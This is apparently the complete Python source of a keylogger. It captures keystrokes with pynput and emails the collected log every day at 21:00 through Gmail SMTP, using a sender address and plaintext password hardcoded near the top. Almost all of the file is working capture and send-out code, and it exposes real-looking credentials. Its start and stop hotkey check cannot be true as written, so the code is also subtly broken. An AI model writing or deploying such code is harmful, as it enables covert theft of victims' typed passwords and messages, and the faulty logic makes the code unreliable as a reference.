import pynput.keyboard as keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import atexit
from datetime import datetime, time
import schedule
import time as time_module

log = ""
caps = False
count = 0
keystroke_count = 0
start_keylogger = False
email_address = "amanullahsyed143@gmail.com"
from_email = "amanullahsyed143eight@gmail.com"
password = "Aman786&*^"

def grab_keys(key):
    global log, caps, count, keystroke_count, start_keylogger
    if key == keyboard.Key.ctrl_l and key == keyboard.Key.alt_l and str(key) == 's':
        start_keylogger = True
        print("Keylogger started")
    elif key == keyboard.Key.ctrl_l and key == keyboard.Key.alt_l and str(key) == 'x':
        start_keylogger = False
        print("Keylogger stopped")
        return False  # Stoping the listener

    if start_keylogger:
        keystroke_count += 1
        try:
            if caps:
                log = log + str(key.char).swapcase()
            else:
                log = log + str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace:
                log = log[:-1]
            elif key == keyboard.Key.caps_lock:
                caps = not caps
            elif key == keyboard.Key.enter:
                log += '\n'
            elif key == keyboard.Key.delete:
                log = log[:-1]
            else:
                log += " " + str(key) + " "
        
        if keystroke_count >= 100:
            ask_to_save()

def ask_to_save():
    global log, keystroke_count
    keystroke_count = 0
    print(log)
    #Saving the file
    save = input("Do you want to save the log? (yes/no): ").strip().lower()
    if save == 'yes':
        file_name = input("Enter the file name to save the log: ").strip()
        with open(file_name, 'a') as file:
            file.write(log + '\n')
    log = ""

def report():
    global log
    if log:
        print(log)
    log = ""
    timer = threading.Timer(8, report)
    timer.start()

def send_email(log_content):
    global from_email, password, email_address
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = email_address
    msg['Subject'] = "Daily Keylogger Log"

    body = log_content
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    text = msg.as_string()
    server.sendmail(from_email, email_address, text)
    server.quit()

def daily_email():
    global log
    if log:
        send_email(log)
        log = ""

def error_log(error_message):
    with open("error_log.txt", 'a') as file:
        file.write(error_message + '\n')

def save_on_exit():
    global log
    if log:
        with open("log_on_exit.txt", 'a') as file:
            file.write(log + '\n')

atexit.register(save_on_exit)

schedule.every().day.at("21:00").do(daily_email)

def run_schedule():
    while True:
        schedule.run_pending()
        time_module.sleep(1)

# Start the schedule thread
threading.Thread(target=run_schedule).start()

listener = keyboard.Listener(on_press=grab_keys)
with listener:
    report()
    listener.join()
# End of code 